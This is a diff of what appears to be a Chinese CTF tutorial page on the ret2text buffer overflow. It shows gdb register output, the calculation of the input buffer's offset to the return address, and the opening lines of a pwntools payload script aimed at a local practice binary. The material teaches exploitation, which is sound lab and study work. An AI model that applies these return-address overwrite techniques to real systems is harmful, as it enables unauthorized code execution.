@@ -58,7 +58,7 @@ Breakpoint <span class=m>1</span>, 0x080486ae in main <span class=o>()</span> at
 <span class=nv>$esi</span>   : 0xf7fae000  →  0x001b1db0
 <span class=nv>$edi</span>   : 0xf7fae000  →  0x001b1db0
 <span class=nv>$eip</span>   : 0x080486ae  →  &lt;main+102&gt; call 0x8048460 &lt;gets@plt&gt;
-</code></pre></div> <p>可以看到 esp 为 0xffffcd40，ebp 为具体的 payload 如下 0xffffcdc8，同时 s 相对于 esp 的索引为 [esp+0x1c]，所以，s 的地址为 0xffffcd5c，所以 s 相对于 ebp 的偏移为 0x6C，所以相对于返回地址的偏移为 0x6c+4。</p> <p>最后的 payload 如下：</p> <div class=highlight><pre><span></span><code><span class=c1>##!/usr/bin/env python</span>
+</code></pre></div> <p>可以看到 esp 为 0xffffcd40，ebp 为 0xffffcdc8，同时 s 相对于 esp 的索引为 <code>esp+0x1c</code>，因此，我们可以推断</p> <ul> <li>s 的地址为 0xffffcd5c</li> <li>s 相对于 ebp 的偏移为 0x6c</li> <li>s 相对于返回地址的偏移为 0x6c+4</li> </ul> <p>最后的 payload 如下：</p> <div class=highlight><pre><span></span><code><span class=c1>##!/usr/bin/env python</span>
 <span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
 
 <span class=n>sh</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./ret2text&#39;</span><span class=p>)</span>
